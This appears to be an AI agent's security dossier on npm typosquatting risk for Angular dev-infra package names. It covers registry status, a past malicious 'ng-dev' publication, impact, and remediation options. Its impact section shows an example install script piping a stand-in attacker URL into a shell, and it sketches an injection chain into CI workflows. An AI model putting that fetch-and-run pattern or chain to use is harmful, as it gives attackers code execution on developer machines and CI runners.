# DOSSIER — npm typosquat exposure for angular/dev-infra distribution names

- **Workstream:** WS2 (operator deliverables)
- **Author:** workstream agent (lane D3 context: update-models verbatim-rewrite injection, distribution-channel lane D1)
- **Date / evidence collected:** 2026-08-13 (UTC), against live public metadata only
- **Target:** `angular/dev-infra` @ `04230133d395dfb032d782b8e63b4fcbbd406aa5`
- **Channels checked:** registry.npmjs.org (metadata GETs, `npm view`), api.npmjs.org (downloads), registry.yarnpkg.com (mirror parity), GitHub code search (`gh search code`), ossf/malicious-packages (OSV)
- **Constraint honored:** metadata reads only — no package download, no install, no publish, no write to the target tree.

---

## 1. Registry state (re-verified 2026-08-13)

Real distribution names per the repo's own `.ng-dev/release.mjs` (4 npm packages) plus all
unscoped/typo variants. `exists` = HTTP 200 with installable dist-tags on registry.npmjs.org.

| name | status | publisher (if exists) | notes |
|---|---|---|---|
| `@angular/ng-dev` | **404** | — | Real package name; **not present on the public npm registry**. Actual distribution is the private git snapshot repo `angular/dev-infra-private-ng-dev-builds` consumed via commit-pinned git URL (see §2). |
| `rules_angular` | **404** | — | Real package name; not on npm. Consumed via Bazel (BCR `bazel_dep`), not npm. |
| `rules_browsers` | **404** | — | Real package name; not on npm. Bazel-consumed. |
| `rules_sass` | **404** | — | Real package name; not on npm. Bazel-consumed. |
| `ng-dev` | **tombstone (unpublished)** | — (was maliciously published) | Versions `20.1.1` + `20.9.1` published 2025-08-18, **flagged malicious — OSV `MAL-2025-47694`** (Amazon Inspector + ReversingLabs), removed. A `0.0.1` was published 2026-07-09 and **unpublished 2026-07-13**. Name is currently fully unpublished → **re-claimable by anyone** (`npm view` → "Unpublished on 2026-07-13"; downloads API → not found). |
| `angular-ng-dev` | **404** | — | Claimable. |
| `rules-angular` | **404** | — | Claimable (hyphen form of the real `rules_angular`). |
| `rules-browsers` | **404** | — | Claimable. |
| `rules-sass` | **404** | — | Claimable. |
| `@angular/ngdev` | **404** | — | Scoped name. **Not claimable by outsiders** — the `@angular` scope is owned by the Angular org (maintainers: `angular` + `google-wombot`); publishing under a scope requires scope membership. Low risk. |
| `@angular/dev-infra` | **404** | — | Scoped name. Scope-protected as above. Low risk. |
| `dev-infra` | **EXISTS** | `pvinics` (pvinics@gmail.com) | Unrelated project "message-infra" (`https://github.com/pviniciusm/message-infra`), created 2021-03-16, latest 1.1.4, 22 downloads last month. **Name taken by an unrelated party** — cannot be claimed without npm support intervention. |
| `angular-dev-infra` | **404** | — | Claimable. |

**Bottom line:** six unscoped names are open for registration right now — `ng-dev`,
`angular-ng-dev`, `rules-angular`, `rules-browsers`, `rules-sass`, `angular-dev-infra`. The most
dangerous, `ng-dev`, **has already been abused once** (MAL-2025-47694, Aug 2025, malicious
`20.1.1`/`20.9.1` mirroring Angular's real version numbering). The real `@angular/ng-dev` and the
three `rules_*` names are absent from npm entirely, so the only "canonical-looking" npm surface a
consumer can hit is attacker-controllable.

---

## 2. Code-search: who references the unscoped names?

Method: `gh search code` (GitHub's indexed default-branch corpus), plus registry download stats as
a ground-truth cross-check. Limitation: GitHub code search covers default branches of indexed public
repos only — it under-counts forks, private repos, and non-GitHub sources.

### `@angular/ng-dev` (scoped, legit)
Referenced by: `angular/angular`, `angular/angular-cli`, `angular/components`, `ng-packagr`,
`mesop-dev/mesop`, `sbb-design-systems/sbb-angular`, `ng-docs/angular-cn` — **every one via the git
snapshot URL**, e.g.:

```
"@angular/ng-dev": "https://github.com/angular/dev-infra-private-ng-dev-builds.git#c71d9b6af7560faa3d002534d416a8045111adae"
```

i.e. the real channel is **commit-pinned git**, not npm. `.ng-dev/*.mjs` config files in the same
repos `import("@angular/ng-dev")` for types, resolved through the same git dep. No public repo
depends on `@angular/ng-dev` from the npm registry.

### `ng-dev` (unscoped)
- `filename:package.json` hits for `"ng-dev"` are **npm script aliases only** (e.g.
  `"ng-dev": "ng-dev"` in `angular/angular`; `"ng-dev": "bash ./tools/local-dev.sh"` in
  dev-infra itself) — not dependencies on an unscoped `ng-dev` package.
- Zero hits for `"npm install ng-dev"`, `"npm i ng-dev"`, `"npm install -g ng-dev"`, or
  `"install -g ng-dev"` in the indexed corpus.
- Downloads API: `ng-dev` → "package not found" (no install traffic; consistent with tombstone).

### `rules_*` names
- All public references (`angular/angular`, `angular/components`, `angular/angular-cli`,
  `sbb-design-systems/sbb-angular`, `angular/rules_sass`, `quittle/*`) are **Bazel**
  `bazel_dep(name = "rules_angular" | "rules_sass" | "rules_browsers")` in `MODULE.bazel` /
  `WORKSPACE` — resolved via the Bazel Central Registry, **not npm**.
- Zero hits for `npm install rules_angular` / `npm install rules_sass`.

### Typos (`angular-ng-dev`, `angular-dev-infra`, `@angular/ngdev`, `@angular/dev-infra`)
- `@angular/dev-infra` appears once, as a Renovate `matchPackageNames` entry in
  `sbb-design-systems/sbb-angular` (a config pattern for a name that does not exist on npm).
- No other references in the indexed corpus.

### Quantified third-party exposure
- **Public npm installs of any unscoped name: ~0 observed** (code search + downloads API).
- **npm registry dependency on the real names: 0** — the four real names are absent from npm.
- The realistic victim set is not today's consumers but **tomorrow's**:
  - a developer typing `npm install ng-dev` (or `rules-angular`, `angular-ng-dev`, …) from memory,
    docs, an LLM suggestion, or an old blog post;
  - any `package.json` authored with the unscoped name (autocomplete/LLM-driven);
  - any CI that copy-pastes such an install command.

---

## 3. Impact

If a consumer runs `npm install <claimable name>` (or the name lands in their `package.json` and
any later `pnpm install` / `npm install` runs):

1. **Install-time code execution (default npm behavior).** npm runs the package's
   `preinstall`/`install`/`postinstall` lifecycle scripts by default. An attacker publishes a
   package named e.g. `ng-dev` whose `install` script runs `curl attacker.sh | sh` → code executes
   on the consumer's machine / CI runner with the installing user's privileges, before any code
   review of the "dependency".
2. **CLI-use code execution.** For `ng-dev` specifically, the name is a CLI. An attacker provides a
   `bin` entry; the payload fires on first invocation (`npx ng-dev …`), with the same blast radius.
3. **Version-number mirroring makes it plausible.** The 2025 attack published versions `20.1.1` and
   `20.9.1` — matching Angular's own ng-dev release cadence — so naive range resolution (`^20.x`,
   `latest`) picks the malicious version without any odd-looking version string.
4. **Precedent is real:** OSV `MAL-2025-47694` documents malicious code in unscoped `ng-dev`
   (20.1.1, 20.9.1; finders: Amazon Inspector, ReversingLabs; published to OSV 2025-09-26). The
   exact name at issue in this dossier has already been weaponized once.
5. **Amplification relative to lane D3:** the D3 finding (update-models bot rewrites
   network-parsed model strings verbatim into committed TS/YAML via `.github/local-actions/update-models/lib/main.ts`
   `writeFile`, glob `dot: true` covering `.github/workflows`) is a *write-side* injection. A
   claimed npm name is the *read-side* twin: a consumer running an install command with the wrong
   name gets arbitrary code without any bot involvement. Combined, a compromised Gemini-deprecations
   page (or its CDN) that injects `npm i ng-dev` style content into generated YAML converts into
   workflow-level code execution in consuming repos.

Severity framing: this is a **registry-name exposure (hardening-grade)** as long as nobody installs
the names; it escalates to **arbitrary code execution in consumer environments** the moment a
victim installs a claimed name — and the exact `ng-dev` name has already been claimed maliciously
once.

---

## 4. Remediation options (with tradeoffs)

### Option A — Claim the six unscoped names under the Angular org npm account
Publish inert placeholder packages (`ng-dev`, `angular-ng-dev`, `rules-angular`,
`rules-browsers`, `rules-sass`, `angular-dev-infra`) from the org account: a README pointing at the
real package/git repo, **zero lifecycle scripts**, no `bin`. Optionally a `postinstall` that prints
a warning ("you installed a placeholder; the real package is @angular/ng-dev from the dev-infra git
repo") without failing the install.

- **Pros:** closes the window permanently (npm never releases a name with a live version); cheap
  (six `npm publish`es); removes the exact vector already exploited in 2025; gives future
  accidental installers a clear message instead of attacker code.
- **Cons:** the org must keep the names published forever (never unpublish — unpublishing releases
  the name); needs a credentialed publish path for unscoped names from the org npm account; a
  warning-only script is still a script (keep it inert — message-only, no network, no child
  processes); the account used must have 2FA + least-privilege publish tokens.
- **Cost:** ~one hour + account hygiene. **Recommended primary.**

### Option B — npm org ownership / scope hygiene
Verify the `@angular` scope is fully owned and 2FA-hardened (it is already — maintainers `angular`
+ `google-wombot`; the scoped typos `@angular/ngdev`, `@angular/dev-infra` are therefore
un-claimable by outsiders). For **unscoped** names npm has no org-ownership primitive — claiming by
publishing (Option A) is the only self-service mechanism; a dispute/takedown via npm support is the
reactive fallback (`dev-infra` is already occupied by `pvinics`; reclaiming it would need npm
support, with no guarantee of success).
- **Pros:** closes scoped-name questions immediately (already the case); zero new artifacts.
- **Cons:** does not cover the unscoped names at all — the actual risk surface.
- **Cost:** free. **Do regardless** (mostly verification).

### Option C — Monitor-and-alert (detect, don't prevent)
Watch the npm registry for new publications of the six names (e.g., registry change feeds,
Socket.dev / npm audit / OSV feed for `pkg:npm/ng-dev` etc.) and report to npm security + Google
OSS VRP on detection, mirroring how MAL-2025-47694 was caught by Amazon Inspector/ReversingLabs.
- **Pros:** zero publishing footprint; catches abuses on names the org chooses not to claim.
- **Cons:** purely reactive — the window between publication and takedown is when victims install;
  the 2025 incident proves the name is targeted, so detection alone is a weak control.
- **Cost:** a scheduled job + on-call triage. **Recommended as backstop**, not the primary fix.

### Option D — Accept
Rationale: measured public exposure to the unscoped names is ~0 (no install commands in the indexed
corpus, no npm downloads), and the real distribution channel is commit-pinned git, which typosquat
cannot intercept.
- **Pros:** zero effort; no new publish surface.
- **Cons:** ignores the 2025 weaponization of the exact `ng-dev` name; exposure is one bad
  copy-paste away from becoming RCE; "no observed exposure" is a weak prior when the attacker can
  manufacture the demand (SEO, docs poisoning, LLM training-data influence) after claiming the name.
- **Cost:** residual risk, potentially realized. **Not recommended as sole posture.**

### Recommended posture
**A (claim) + C (monitor) + B (verify scope hygiene).** D alone is not justified given the
MAL-2025-47694 precedent. Claiming six inert names is the cheapest durable prevention; monitoring
catches anything claimed anyway (including future name variants); scope verification is free.

---

## 5. Evidence log

- `npm view @angular/ng-dev` → E404 (and `curl registry.npmjs.org/@angular%2Fng-dev` → HTTP 404 `{"error":"Not found"}`).
- `npm view rules_angular|rules_browsers|rules_sass` → E404 (all three).
- `npm view ng-dev` → E404 "Unpublished on 2026-07-13T10:19:47.540Z"; registry doc `_id: ng-dev`,
  time map: `20.1.1`/`20.9.1` @ 2025-08-18, `0.0.1` published 2026-07-09 → unpublished 2026-07-13;
  no `versions`, no `dist-tags` (tombstone). Identical doc on registry.yarnpkg.com.
- OSV `ossf/malicious-packages/osv/malicious/npm/ng-dev/MAL-2025-47694.json`: affected versions
  `20.1.1`, `20.9.1`; finders Amazon Inspector + ReversingLabs (RLMA-2025-05084); published
  2025-09-26.
- `npm view dev-infra` → exists; maintainer `pvinics`; repo `pviniciusm/message-infra`;
  22 downloads last month.
- `@angular/ng-dev` consumers all pin git snapshot URL (angular/angular, angular/angular-cli,
  angular/components, ng-packagr, mesop-dev/mesop, sbb-angular, ng-docs/angular-cn).
- `gh search code`: 0 hits for `"npm install ng-dev"`, `"npm i ng-dev"`, `"install -g ng-dev"`,
  `"npm install rules_angular"`, `"npm install rules_sass"`; package.json `ng-dev` hits are script
  aliases; `rules_*` hits are Bazel `bazel_dep`.
- Source verification (clone @ pin): `.ng-dev/release.mjs` lists the four real names;
  `.github/local-actions/update-models/lib/main.ts` — `parseDeprecations()` filter is only
  `replacement.includes('gemini')`, `writeFile(file, updatedContent)` verbatim (line ~103), glob
  `['**/*.{ts,yml,yaml}']` with `dot: true`; workflow `update-models.yml` (schedule 04:00 UTC +
  `workflow_dispatch`) runs `bazel test //...` then creates the PR with
  `ANGULAR_ROBOT_ACCESS_TOKEN` (D3 findings confirmed-in-source).

---

## 6. Open questions for the operator

1. Does the Angular org want to claim the unscoped names under the org npm account, or is there a
   policy reason not to publish placeholder artifacts?
2. `dev-infra` is occupied by an unrelated package (message-infra). Is that name worth pursuing via
   npm support (unlikely to succeed), or should it be excluded from remediation scope?
3. Should the OSV/MAL-2025-47694 precedent be cited in the filing (it strengthens the "attacker
   interest is real" argument but also shows the ecosystem already caught it once)?
